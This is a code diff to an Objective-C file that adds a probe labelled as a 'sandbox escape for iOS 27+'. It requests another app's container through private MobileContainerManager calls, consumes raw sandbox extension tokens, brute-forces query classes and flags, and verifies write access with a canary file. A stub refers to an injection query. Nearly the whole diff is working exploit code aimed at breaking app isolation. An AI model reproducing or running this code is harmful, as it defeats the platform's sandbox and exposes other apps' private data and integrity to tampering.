@@ -3,6 +3,7 @@
 #import <Foundation/Foundation.h>
 #import <dlfcn.h>
 #import <stdlib.h>
+#import <unistd.h>
 #import <xpc/xpc.h>
 #import <fcntl.h>
 #import <os/lock.h>
@@ -251,6 +252,190 @@ NSString *DavizinGetContainerPath(NSString *bundleID, NSString **outError) {
     return path;
 }
 
+#pragma mark - Probe: VPN-free sandbox escape for iOS 27+
+
+typedef int64_t (*SandboxExtConsumeFunc)(const char *);
+typedef int64_t (*SandboxExtReleaseFunc)(int64_t);
+
+static BOOL _mcmProbeCanWrite(const char *dirPath) {
+    char canary[1200];
+    snprintf(canary, sizeof(canary), "%s/.mcm_probe_canary", dirPath);
+    FILE *f = fopen(canary, "w");
+    if (!f) return NO;
+    fprintf(f, "mcmprobe");
+    fclose(f);
+    f = fopen(canary, "r");
+    if (!f) { unlink(canary); return NO; }
+    char buf[16] = {0};
+    fread(buf, 1, 8, f);
+    fclose(f);
+    unlink(canary);
+    return (strcmp(buf, "mcmprobe") == 0);
+}
+
+DavizinProbeResult DavizinProbeContainerWriteAccess(NSString *containerPath, NSString *bundleID) {
+    DavizinProbeResult result = { .method = 0, .handle = -1, .writeOK = NO };
+    result.detail[0] = '\0';
+
+    if (!containerPath || containerPath.length == 0 || !bundleID || bundleID.length == 0) {
+        strlcpy(result.detail, "nil containerPath or bundleID", sizeof(result.detail));
+        return result;
+    }
+
+    const char *pathC = containerPath.UTF8String;
+    const char *bidC = bundleID.UTF8String;
+
+    MCMAPI *api = MCMGetAPI();
+    SandboxExtConsumeFunc consumeExt = (SandboxExtConsumeFunc)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
+    SandboxExtReleaseFunc releaseExt = (SandboxExtReleaseFunc)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
+
+    if (!api->queryCreate || !consumeExt) {
+        strlcpy(result.detail, "missing symbols", sizeof(result.detail));
+        return result;
+    }
+
+    // ── Strategy 1: MCM class-2 query → raw sandbox_extension_consume ──
+    DavizinMCMLog(@"[Probe] Strategy 1: MCM class-2 + raw consume");
+    {
+        void *q = api->queryCreate();
+        if (q) {
+            api->querySetClass(q, 2);
+            xpc_object_t xid = xpc_string_create(bidC);
+            api->querySetIdentifiers(q, xid);
+            api->querySetFlags(q, 0x900000000ULL);
+            if (api->querySetPart) api->querySetPart(q, 0);
+
+            void *res = api->queryGetSingle(q);
+            if (res) {
+                // 1a: objectActivate(false) — the standard path
+                if (api->objectCopy && api->objectActivate) {
+                    void *act = api->objectCopy(res);
+                    if (act) {
+                        bool ok = api->objectActivate(act, false);
+                        DavizinMCMLog([NSString stringWithFormat:@"[Probe] 1a activate(false)=%d", ok]);
+                        if (ok && _mcmProbeCanWrite(pathC)) {
+                            result.method = 1;
+                            result.handle = 0;
+                            result.writeOK = YES;
+                            strlcpy(result.detail, "MCM activate(false) VERIFIED", sizeof(result.detail));
+                            // keep activation alive in lease storage
+                            os_unfair_lock_lock(&sLeaseLock);
+                            MCMLease *lease = allocLease();
+                            if (lease->active && lease->query) {
+                                if (lease->activation && api->objectFree) api->objectFree(lease->activation);
+                                api->queryFree(lease->query);
+                            }
+                            lease->query = q;
+                            lease->activation = act;
+                            strlcpy(lease->bundleID, bidC, sizeof(lease->bundleID));
+                            strlcpy(lease->path, pathC, sizeof(lease->path));
+                            lease->active = true;
+                            os_unfair_lock_unlock(&sLeaseLock);
+                            xpc_release(xid);
+                            return result;
+                        }
+                        if (api->objectFree) api->objectFree(act);
+                    }
+                }
+
+                // 1b: objectActivate(true) — force mode
+                if (api->objectCopy && api->objectActivate) {
+                    void *act = api->objectCopy(res);
+                    if (act) {
+                        bool ok = api->objectActivate(act, true);
+                        DavizinMCMLog([NSString stringWithFormat:@"[Probe] 1b activate(true)=%d", ok]);
+                        if (ok && _mcmProbeCanWrite(pathC)) {
+                            result.method = 1;
+                            result.handle = 0;
+                            result.writeOK = YES;
+                            strlcpy(result.detail, "MCM activate(true) VERIFIED", sizeof(result.detail));
+                            os_unfair_lock_lock(&sLeaseLock);
+                            MCMLease *lease = allocLease();
+                            if (lease->active && lease->query) {
+                                if (lease->activation && api->objectFree) api->objectFree(lease->activation);
+                                api->queryFree(lease->query);
+                            }
+                            lease->query = q;
+                            lease->activation = act;
+                            strlcpy(lease->bundleID, bidC, sizeof(lease->bundleID));
+                            strlcpy(lease->path, pathC, sizeof(lease->path));
+                            lease->active = true;
+                            os_unfair_lock_unlock(&sLeaseLock);
+                            xpc_release(xid);
+                            return result;
+                        }
+                        if (api->objectFree) api->objectFree(act);
+                    }
+                }
+
+                // 1c: raw sandbox_extension_consume on the MCM sandbox token
+                if (api->objectCopyToken) {
+                    char *token = api->objectCopyToken(res);
+                    if (token && token[0]) {
+                        int64_t h = consumeExt(token);
+                        DavizinMCMLog([NSString stringWithFormat:@"[Probe] 1c raw consume handle=%lld", (long long)h]);
+                        if (h >= 0 && _mcmProbeCanWrite(pathC)) {
+                            result.method = 2;
+                            result.handle = h;
+                            result.writeOK = YES;
+                            snprintf(result.detail, sizeof(result.detail),
+                                     "MCM raw consume VERIFIED handle=%lld", (long long)h);
+                            free(token);
+                            // keep query alive (token depends on it)
+                            os_unfair_lock_lock(&sLeaseLock);
+                            MCMLease *lease = allocLease();
+                            if (lease->active && lease->query) {
+                                if (lease->activation && api->objectFree) api->objectFree(lease->activation);
+                                api->queryFree(lease->query);
+                            }
+                            lease->query = q;
+                            lease->activation = NULL;
+                            strlcpy(lease->bundleID, bidC, sizeof(lease->bundleID));
+                            strlcpy(lease->path, pathC, sizeof(lease->path));
+                            lease->active = true;
+                            os_unfair_lock_unlock(&sLeaseLock);
+                            xpc_release(xid);
+                            return result;
+                        }
+                        if (h >= 0 && releaseExt) releaseExt(h);
+                    }
+                    free(token);
+                }
+            } else {
+                DavizinMCMLog([NSString stringWithFormat:@"[Probe] Strategy 1 query returned NULL for %@", bundleID]);
+            }
+            xpc_release(xid);
+            api->queryFree(q);
+        }
+    }
+
+    // ── Strategy 2: bad_query_probe_write (multi-class/flags brute force) ──
+    DavizinMCMLog(@"[Probe] Strategy 2: bad_query_probe_write");
+    {
+        BQProbeResult bq = bad_query_probe_write(pathC, bidC);
+        if (bq.write_ok) {
+            result.method = bq.method + 10; // offset to distinguish from MCM methods
+            result.handle = bq.handle;
+            result.writeOK = YES;
+            snprintf(result.detail, sizeof(result.detail), "bad_query: %s", bq.detail);
+            DavizinMCMLog([NSString stringWithFormat:@"[Probe] *** SUCCESS: %s ***", result.detail]);
+            return result;
+        }
+        DavizinMCMLog([NSString stringWithFormat:@"[Probe] bad_query_probe_write failed: %s", bq.detail]);
+    }
+
+    strlcpy(result.detail, "all probe strategies exhausted", sizeof(result.detail));
+    DavizinMCMLog(@"[Probe] ALL STRATEGIES FAILED");
+    return result;
+}
+
+void DavizinProbeRelease(DavizinProbeResult *res) {
+    if (!res || res->handle <= 0) return;
+    SandboxExtReleaseFunc releaseExt = (SandboxExtReleaseFunc)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
+    if (releaseExt) releaseExt(res->handle);
+    res->handle = -1;
+}
+
 #pragma mark - Stubs
 
 NSString *DavizinPrepareInjectionQuery(NSString *bundleID, NSString **outErr) {
@@ -258,5 +443,5 @@ NSString *DavizinPrepareInjectionQuery(NSString *bundleID, NSString **outErr) {
 }
 
 NSString *DavizinMCMLastDiagnostic(void) {
-    return @"Using direct container_query C API with persistent lease";
+    return @"Using direct container_query C API with persistent lease + probe";
 }
